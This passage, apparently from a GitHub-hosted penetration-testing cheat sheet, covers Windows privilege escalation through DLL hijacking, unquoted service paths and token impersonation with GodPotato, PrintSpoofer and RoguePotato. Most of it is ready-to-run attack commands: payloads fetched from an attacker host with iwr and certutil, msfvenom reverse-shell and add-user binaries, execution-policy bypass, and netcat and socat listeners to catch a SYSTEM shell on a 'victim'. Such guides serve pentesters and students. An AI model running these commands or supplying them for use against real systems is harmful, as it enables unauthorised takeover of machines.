class=\"pl-k\"\u003e!\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e \u003cstrong\u003eNOTE:\u003c/strong\u003e Make sure you match the DLL to the \u003cem\u003e\u003cstrong\u003eappropriate architecture\u003c/strong\u003e\u003c/em\u003e of the target binary (32-bit vs 64-bit)!!! If you don't, your exploit will fail!\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003ePut the new DLL in the search path of the service executable on the victim host, then restart the service.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# copy the dll to the correct location with the correct name\niwr -uri http://LISTEN_IP/derp.dll -Outfile C:\\path\\to\\REALNAME.dll\n# or\ncertutil -urlcache -split -f http://LISTEN_IP/derp.dll C:\\path\\to\\REALNAME.dll\n\n# restart service\nRestart-Service VICTIMSERVICE\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e copy the dll to the correct location with the correct name\u003c/span\u003e\niwr \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003euri http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003eLISTEN_IP\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ederp.dll \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eOutfile C:\\path\\to\\REALNAME.dll\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or\u003c/span\u003e\ncertutil \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eurlcache \u003cspan class=\"pl-k\"\u003e-split\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-f\u003c/span\u003e http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003eLISTEN_IP\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ederp.dll C:\\path\\to\\REALNAME.dll\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e restart service\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eRestart-Service\u003c/span\u003e VICTIMSERVICE\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.5 Unquoted Windows Service Paths\u003c/h3\u003e\u003ca id=\"user-content-425-unquoted-windows-service-paths\" class=\"anchor\" aria-label=\"Permalink: 4.2.5 Unquoted Windows Service Paths\" href=\"#425-unquoted-windows-service-paths\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf a Windows service's path contains spaces and isn't quoted in the service entry, you might be able to hijack its execution by inserting a binary that gets executed in its place. This requires write permissions to the \u003cstrong\u003eparent directory\u003c/strong\u003e of whichever path component contains a space, and you drop and EXE in that directory named \u003ccode\u003eword-before-space.exe\u003c/code\u003e. For example, if the path starts with \u003ccode\u003eC:\\Program Files\\...\u003c/code\u003e, then you'd need write permissions to \u003ccode\u003eC:\\\u003c/code\u003e, and would drop an EXE named \u003ccode\u003eProgram.exe\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThis is how Windows tries to resolve the unquoted path \u003ccode\u003eC:\\Program Files\\My Program\\My service\\service.exe\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"C:\\Program.exe\nC:\\Program Files\\My.exe\nC:\\Program Files\\My Program\\My.exe\nC:\\Program Files\\My Program\\My service\\service.exe\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eC:\\Program.exe\nC:\\Program Files\\My.exe\nC:\\Program Files\\My Program\\My.exe\nC:\\Program Files\\My Program\\My service\\service.exe\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eFinding Unquoted Service Paths\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# lists all unquoted service paths with a space in them\nGet-CimInstance -ClassName win32_service | Where-Object {$_.PathName -notlike 'C:\\Windows\\*' -and $_.PathName -notlike '\u0026quot;*' -and $_.PathName -like '* *.exe*'} | select Name,PathName\n# alternatively, for cmd only\nwmic service where \u0026quot;pathname like '% %.exe%'\u0026quot; get name,pathname |  findstr /ipv \u0026quot;C:\\\\Windows\\\\\u0026quot; | findstr /ipv \u0026quot;\u0026quot;\u0026quot;\n\n\n# alternatively, use PowerUp.ps1\niwr http://LISTEN_IP/PowerUp.ps1 -Outfile PowerUp.ps1\npowershell -ep bypass\n. .\\PowerUp.ps1\nGet-UnquotedService\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e lists all unquoted service paths with a space in them\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-CimInstance\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eClassName win32_service \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eWhere-Object\u003c/span\u003e {\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.PathName\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-notlike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eC:\\Windows\\*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-and\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.PathName\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-notlike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\"*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-and\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.PathName\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-like\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e* *.exe*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e} \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select Name\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003ePathName\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e alternatively, for cmd only\u003c/span\u003e\nwmic service \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003epathname like '% %.exe%'\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e get name\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003epathname \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e  findstr \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eipv \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\\\Windows\\\\\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eipv \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e\"\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e# alternatively, use PowerUp.ps1\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003eiwr http://LISTEN_IP/PowerUp.ps1 -Outfile PowerUp.ps1\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003epowershell -ep bypass\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e. .\\PowerUp.ps1\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003eGet-UnquotedService\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFor paths you find, check permissions of each appropriate directory with \u003ccode\u003eicacls DIRECTORY\u003c/code\u003e. Look for write permissions (F, M, W), especially for \u003ccode\u003eAuthenticated Users\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eExploiting:\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eOnce you find your candidate, generate a payload binary with \u003ccode\u003emsfvenom\u003c/code\u003e or whatever:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# add user - msfvenom\nmsfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1!\n\n# host on http\nsudo python -m http.server 80\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e add user - msfvenom\u003c/span\u003e\nmsfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e host on http\u003c/span\u003e\nsudo python -m http.server 80\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThen drop it in the appropriate directory with the appropriate name on the victim:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# grab file and put it in right spot with right name\niwr http://VICTIM_IP/derp.exe -outfile C:\\path\\to\\file.exe\n\n# restart the service\nrestart-service \u0026quot;SERVICENAME\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e grab file and put it in right spot with right name\u003c/span\u003e\niwr http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003eVICTIM_IP\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ederp.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eoutfile C:\\path\\to\\\u003cspan class=\"pl-c1\"\u003efile.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e restart the service\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003erestart-service\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSERVICENAME\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you are using PowerUp, you can use that to exploit the vulnerability:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"powershell -e bypass\n. .\\PowerUp.ps1\n# change path as appropriate\nWrite-ServiceBinary -Name 'SERVICENAME' -UserName 'derp' -Password 'herpderp' -Path \u0026quot;C:\\Program Files\\Enterprise Apps\\Current.exe\u0026quot;\n\n# still restart service\nrestart-service \u0026quot;SERVICENAME\u0026quot;\"\u003e\u003cpre\u003epowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ee bypass\n\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003e .\\PowerUp.ps1\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e change path as appropriate\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eWrite-ServiceBinary\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eName \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eSERVICENAME\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eUserName \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ederp\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePassword \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eherpderp\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePath \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\Program Files\\Enterprise Apps\\Current.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e still restart service\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003erestart-service\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSERVICENAME\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.6 Windows Token Impersonation\u003c/h3\u003e\u003ca id=\"user-content-426-windows-token-impersonation\" class=\"anchor\" aria-label=\"Permalink: 4.2.6 Windows Token Impersonation\" href=\"#426-windows-token-impersonation\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can use token impersonation to elevate privileges.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThese require the \u003ccode\u003eSeImpersonatePrivilege\u003c/code\u003e or \u003ccode\u003eSeAssignprimaryTokenPrivilege\u003c/code\u003e to be enabled. This is the case when you have a shell running as \u003ccode\u003eNT AUTHORITY\\LOCAL SERVICE\u003c/code\u003e, as well as \u003ccode\u003eLocal System\u003c/code\u003e, \u003ccode\u003eNetwork Service\u003c/code\u003e, and \u003ccode\u003eApplication Pool Identity\u003c/code\u003e (common when access was from exploiting IIS or other Windows services).\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.6.1 Windows Token Impersonation with GodPotato\u003c/h4\u003e\u003ca id=\"user-content-4261-windows-token-impersonation-with-godpotato\" class=\"anchor\" aria-label=\"Permalink: 4.2.6.1 Windows Token Impersonation with GodPotato\" href=\"#4261-windows-token-impersonation-with-godpotato\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eGodPotato works with a wide range of Windows versions (Windows Server 2012 - Windows Server 2022; Windows 8 - Windows 11). It's also very easy to use as a way to run a command as SYSTEM as long as your current user has the \u003ccode\u003eSeImpersonatePrivilege\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# On windows host, first check .NET version\ndir C:\\windows\\microsoft.net\\framework\\\n\n# On Kali, download appropriate binary\nwget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe\n\n# also generate a reverse shell\nmsfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=tun0\n\n# start a HTTP server to host the binaries\npython -m http.server 80\n\n# start reverse shell listener\nnc -lvnp 443\n\n# On windows, download and execute GodPotato with reverse shell\ncd C:\\Users\\Public\niwr -uri http://LISTEN_IP/derp.exe -Outfile derp.exe\niwr -uri http://LISTEN_IP/GodPotato-NET4.exe -Outfile GodPotato.exe\n.\\GodPotato.exe -cmd \u0026quot;C:\\users\\public\\derp.exe\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e On windows host, first check .NET version\u003c/span\u003e\ndir C:\u003cspan class=\"pl-cce\"\u003e\\w\u003c/span\u003eindows\u003cspan class=\"pl-cce\"\u003e\\m\u003c/span\u003eicrosoft.net\u003cspan class=\"pl-cce\"\u003e\\f\u003c/span\u003eramework\\\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e On Kali, download appropriate binary\u003c/span\u003e\nwget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e also generate a reverse shell\u003c/span\u003e\nmsfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=tun0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start a HTTP server to host the binaries\u003c/span\u003e\npython -m http.server 80\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start reverse shell listener\u003c/span\u003e\nnc -lvnp 443\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e On windows, download and execute GodPotato with reverse shell\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ecd\u003c/span\u003e C:\u003cspan class=\"pl-cce\"\u003e\\U\u003c/span\u003esers\u003cspan class=\"pl-cce\"\u003e\\P\u003c/span\u003eublic\niwr -uri http://LISTEN_IP/derp.exe -Outfile derp.exe\niwr -uri http://LISTEN_IP/GodPotato-NET4.exe -Outfile GodPotato.exe\n.\u003cspan class=\"pl-cce\"\u003e\\G\u003c/span\u003eodPotato.exe -cmd \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\users\\public\\derp.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.6.2 Windows Token Impersonation with PrintSpoofer\u003c/h4\u003e\u003ca id=\"user-content-4262-windows-token-impersonation-with-printspoofer\" class=\"anchor\" aria-label=\"Permalink: 4.2.6.2 Windows Token Impersonation with PrintSpoofer\" href=\"#4262-windows-token-impersonation-with-printspoofer\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFirst grab the binary and host it on HTTP.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe\nsudo python3 -m http.server 80\"\u003e\u003cpre\u003ewget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe\nsudo python3 -m http.server 80\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThen throw the exploit on the Windows victim.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"iwr -uri http://LISTEN_IP/PrintSpoofer64.exe -Outfile PrintSpoofer.exe\n\n# throw the exploit\n.\\PrintSpoofer.exe -i -c \u0026quot;powershell\u0026quot;\"\u003e\u003cpre\u003eiwr \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003euri http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003eLISTEN_IP\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ePrintSpoofer64.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eOutfile \u003cspan class=\"pl-c1\"\u003ePrintSpoofer.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e throw the exploit\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003ePrintSpoofer.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ei \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003epowershell\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.6.3 Windows Token Impersonation with RoguePotato\u003c/h4\u003e\u003ca id=\"user-content-4263-windows-token-impersonation-with-roguepotato\" class=\"anchor\" aria-label=\"Permalink: 4.2.6.3 Windows Token Impersonation with RoguePotato\" href=\"#4263-windows-token-impersonation-with-roguepotato\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eNOTE: Alternatives to RoguePotato include: \u003cem\u003eRottenPotato\u003c/em\u003e, \u003cem\u003eSweetPotato\u003c/em\u003e, \u003cem\u003eJuicyPotato\u003c/em\u003e, and \u003ca href=\"https://github.com/antonioCoco/JuicyPotatoNG\"\u003e\u003cem\u003eJuicyPotatoNG\u003c/em\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# on kali box, grab binary\nwget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip\nunzip RoguePotato.zip\n\n# set up socat redirector for roguepotato to bounce off of\nsudo socat -dd tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999\n# also start another netcat listener to catch the system shell\nsudo nc -vlnp 443\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on kali box, grab binary\u003c/span\u003e\nwget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip\nunzip RoguePotato.zip\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set up socat redirector for roguepotato to bounce off of\u003c/span\u003e\nsudo socat -dd tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e also start another netcat listener to catch the system shell\u003c/span\u003e\nsudo nc -vlnp 443\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOn windows victim:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# in windows reverse shell with \u0026quot;SeImpersonatePrivilege\u0026quot;\n# or \u0026quot;SeAssignPrimaryTokenPrivilege\u0026quot; enabled\n\n# grab the binary\niwr -uri http://LISTEN_IP/RoguePotato.exe -Outfile RoguePotato.exe\n\n# run the exploit\n./RoguePotato.exe -l 9999 -e \u0026quot;C:\\Users\\Public\\revshell.exe\u0026quot; -r LISTEN_IP\n# and bingo! you should have system on the listener you set up!\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e in windows reverse shell with \"SeImpersonatePrivilege\"\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or \"SeAssignPrimaryTokenPrivilege\" enabled\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e grab the 